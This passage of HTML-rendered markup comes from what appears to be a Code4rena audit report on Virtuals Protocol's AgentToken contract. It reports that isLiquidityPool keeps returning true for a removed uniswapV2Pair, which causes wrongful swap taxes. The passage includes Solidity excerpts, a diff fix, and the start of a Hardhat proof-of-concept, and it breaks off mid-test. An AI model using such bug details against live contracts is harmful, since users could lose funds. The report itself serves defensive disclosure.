class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_liquidityPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eadd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);        \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Here the `uniswapV2Pair_` gets rightfully added\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSimilarly, these liquidity pools are removed via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L321\"\u003e\u003ccode\u003eAgentToken::removeLiquidityPool\u003c/code\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eremoveLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremovedLiquidityPool_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwnerOrFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Remove this from the enumerated list:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_liquidityPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eremove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremovedLiquidityPool_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);           \u0026lt;\u0026lt;@ \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eLiquidityPoolRemoved\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremovedLiquidityPool_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, the issue lies with the way \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L273\"\u003e\u003ccode\u003eAgentToken::isLiquidityPool\u003c/code\u003e\u003c/a\u003e has been implemented.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003equeryAddress_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/** @dev We check the uniswapV2Pair address first as this is an immutable variable and therefore does not need\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e         * to be fetched from storage, saving gas if this address IS the uniswapV2Pool. We also add this address\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e         * to the enumerated set for ease of reference (for example it is returned in the getter), and it does\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e         * not add gas to any other calls, that still complete in 0(1) time.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e         */\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003equeryAddress_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_liquidityPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econtains\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003equeryAddress_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));   \u0026lt;\u0026lt; @ - \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Returns true even if `uniswapV2Pair` is removed.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs we can observe, even if the \u003ccode\u003euniswapV2Pair\u003c/code\u003e is removed from the \u003ccode\u003e_liquidityPools\u003c/code\u003e via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L321\"\u003e\u003ccode\u003eAgentToken::removeLiquidityPool\u003c/code\u003e\u003c/a\u003e call, the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L273\"\u003e\u003ccode\u003eAgentToken::isLiquidityPool\u003c/code\u003e\u003c/a\u003e would still return true, which is incorrect and hence, would cause taxes upon swaps leading to unwanted loss of funds for the users.\u003c/p\u003e\n\u003ch3 id=\"impact-11\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-11\" aria-label=\"impact 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eBroken \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L273\"\u003e\u003ccode\u003eAgentToken::isLiquidityPool\u003c/code\u003e\u003c/a\u003e leads to excessive taxes for swaps to users, leading to loss of funds.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIt is recommended to set \u003ccode\u003euniswapV2Pair\u003c/code\u003e to a dead/zero address to avoid \u003ccode\u003eisLiquidityPool\u003c/code\u003e returning true.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"77\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    function removeLiquidityPool(address removedLiquidityPool_) external onlyOwnerOrFactory {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Remove this from the enumerated list:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        _liquidityPools.remove(removedLiquidityPool_);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       if(removedLiquidityPool_ == uniswapV2Pair){\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+            uniswapV2Pair = address(0);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        emit LiquidityPoolRemoved(removedLiquidityPool_);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-13\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThe test case below was ran using a base mainnet fork, please add the same to the \u003ccode\u003ehardhat.config.js\u003c/code\u003e file. The hardhat version wasn’t supporting the base mainnet fork, so it had to be upgraded:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"78\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u0026quot;hardhat\u0026quot;: \u0026quot;^2.23.0\u0026quot;,\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAdd the following values to the \u003ccode\u003e.env\u003c/code\u003e file (along with private keys):\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"79\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Genesis DAO settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_VOTING_DELAY=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_VOTING_PERIOD=900\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_PROPOSAL_THRESHOLD=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Virtual DAO settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_VOTING_DELAY=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_VOTING_PERIOD=900\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_PROPOSAL_THRESHOLD=1000000000000000000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_QUORUM_NUMERATOR=1000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Other settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eCHAIN_ID=84532\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVIRTUAL_APPLICATION_THRESHOLD=50000000000000000000 # 50\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVIRTUAL_APPLICATION_THRESHOLD_VIP=125000000000000000000 #125 $V\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMATURITY_DURATION=1000 # number of blocks until initial virtual staker can withdraw (1000 blocks = ~33 minutes)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### AgentToken settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_SUPPLY=1000000000 # 1B supply\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT_TRX=100000 # 100k max token per txn\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT_WALLET=1000000 # 1M token per wallet\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LP_SUPPLY=1000000000 # 1B LP tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT=1000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_VAULT_SUPPLY=0 #\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBOT_PROTECTION=3600 # 1hr\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTAX=100 # 3%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBONDING_TAX=1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSWAP_THRESHOLD=1 # 0.00001% of total supply\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### VOTING_TOKEN=\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTBA_REGISTRY=\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Reward settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePARENT_SHARES=2000 # 20%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_SHARES=1000 # 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eCONTRIBUTOR_SHARES=5000 # 50%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSTAKER_SHARES=9000 # 90%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eREWARD_STAKE_THRESHOLD=2000000000000000000 # 2 eth\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eDATASET_SHARES=7000 # 70%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### TAX MANAGER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMIN_SWAP_THRESHOLD=100000000000000000 # 0.1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMAX_SWAP_THRESHOLD=1000000000000000000000 # 1000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eUNISWAP_ROUTER=0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCreate a file called \u003ccode\u003ePoC.js\u003c/code\u003e and add the following test case inside the \u003ccode\u003e/tests\u003c/code\u003e folder and run \u003ccode\u003enpx hardhat test --grep \"Removed liquidity pair still accrues taxes\"\u003c/code\u003e:\u003c/p\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"80\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { parseEther, toBeHex, formatEther } = require(\u0026quot;ethers/utils\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { expect } = require(\u0026quot;chai\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  loadFixture,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  mine,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  impersonateAccount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  setBalance,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e} = require(\u0026quot;@nomicfoundation/hardhat-toolbox/network-helpers\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { ethers } = require(\u0026quot;hardhat\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003edescribe(\u0026quot;AgentFactory\u0026quot;, () =\u0026gt; {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const PROPOSAL_THRESHOLD = parseEther(\u0026quot;50000\u0026quot;); // 50k\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const MATURITY_SCORE = toBeHex(2000, 32); // 20%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const IP_SHARE = 1000; // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const genesisInput = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    name: \u0026quot;Jessica\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    symbol: \u0026quot;JSC\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tokenURI: \u0026quot;http://jessica\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoName: \u0026quot;Jessica DAO\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    cores: [0, 1, 2],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tbaSalt:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;0xa7647ac9429fdce477ebd9a95510385b756c757c26149e740abbab0ad1be2f16\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tbaImplementation: process.env.TBA_IMPLEMENTATION || ethers.ZeroAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoVotingPeriod: 600,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoThreshold: 1000000000000000000000n,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 